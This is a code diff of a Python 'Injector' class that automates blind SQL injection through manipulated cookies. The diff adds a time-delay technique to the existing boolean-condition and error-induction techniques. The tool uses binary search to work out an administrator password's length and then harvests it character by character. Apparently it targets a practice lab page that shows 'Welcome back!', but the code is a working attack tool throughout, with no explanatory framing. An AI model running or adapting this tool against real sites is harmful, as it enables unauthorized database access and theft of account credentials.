@@ -5,10 +5,18 @@ import threading
 
 class Injector:
 
-    def __init__(self, url:str, poison:dict, length_scope=20, conditional=False, error_induction=False) -> None:
+    def __init__(
+        self, 
+        url:str, 
+        poison:dict,
+        length_scope=20,
+        conditional=False, 
+        error_induction=False, 
+        time_delay=False
+    ) -> None:
 
-        assert not all((conditional, error_induction)), 'can only inject using either'
-        assert any((conditional, error_induction)), 'injection type requred'
+        assert not all((conditional, error_induction,time_delay)), 'can only inject using either'
+        assert any((conditional, error_induction, time_delay)), 'injection type requred'
 
         self.session = requests.Session()
         
@@ -42,9 +50,13 @@ class Injector:
 
             self.injection_type = 2
 
+        if time_delay:
+
+            self.injection_type = 3
+
         assert self.inject_payload(poison['boolean_condition'])
 
-    def _update_password(self, pos:int, character:str):
+    def __update_password(self, pos:int, character:str):
 
         with self.thread_lock:
 
@@ -58,21 +70,57 @@ class Injector:
 
         return cookies
     
-    def inject_payload(self, payload:str):
+    def __inject_time_delay_payload(self, payload:str)->bool:
+
+        try:
+
+            self.session.get(
+                url=self.url,
+                cookies=self.poison_cookie(poison=payload),
+                timeout=5
+            )
+
+        except requests.exceptions.Timeout:
+
+            return True
+
+        return False
+
+    def __inject_conditional_payload(self, payload:str)->bool:
 
         response = self.session.get(
             url=self.url,
             cookies=self.poison_cookie(poison=payload)
         )
 
-        if self.injection_type == 1:
+        soup = BeautifulSoup(response.text, 'html.parser')
+        return True if soup.find(string='Welcome back!') is not None else False
 
-            soup = BeautifulSoup(response.text, 'html.parser')
-            return True if soup.find(string='Welcome back!') is not None else False
+    def __inject_error_induction_payload(self, payload:str)->bool:
+
+        response = self.session.get(
+            url=self.url,
+            cookies=self.poison_cookie(poison=payload)
+        )
 
         return True if response.status_code == 500 else False
+    
+    def inject_payload(self, payload:str)->bool:
 
-    def _query_password_length(self, length:int)->int:
+        if self.injection_type == 1:
+
+            return self.__inject_conditional_payload(payload=payload)
+
+        if self.injection_type == 2:
+
+            return self.__inject_error_induction_payload(payload=payload)
+
+        if self.injection_type == 3:
+
+            return self.__inject_time_delay_payload(payload=payload)
+
+
+    def __query_password_length(self, length:int)->int:
 
         if self.inject_payload(
             payload=self.poison_stash['admin_password_limit'].format("<", length)
@@ -96,9 +144,11 @@ class Injector:
 
         while low <= high:
 
+            print(f'Estimating password length between {low} and {high}')
+
             mid = sum((low, high)) // 2
 
-            answ = self._query_password_length(length=mid)
+            answ = self.__query_password_length(length=mid)
 
             if answ > 0:
 
@@ -112,13 +162,15 @@ class Injector:
 
                 pass_length = mid
 
+                print(f'Password length: {pass_length}')
+
                 break
 
         self.password_found = ['']*pass_length
 
         return pass_length
 
-    def _password_char_finder(self, position:int, ascii_code:int) -> int:
+    def __password_char_finder(self, position:int, ascii_code:int) -> int:
 
         if self.inject_payload(
             payload=self.poison_stash["password_harvester"].format(position, "<", ascii_code)
@@ -141,7 +193,7 @@ class Injector:
 
             mid = sum((low, high)) // 2
 
-            answ = self._password_char_finder(
+            answ = self.__password_char_finder(
                 position=character_info['position'],
                 ascii_code=mid
             )
@@ -160,7 +212,7 @@ class Injector:
 
                 print(f"Got {character} for pos: {character_info['position']}")
 
-                self._update_password(
+                self.__update_password(
                     pos=character_info['position']-1,
                     character=character
                 )
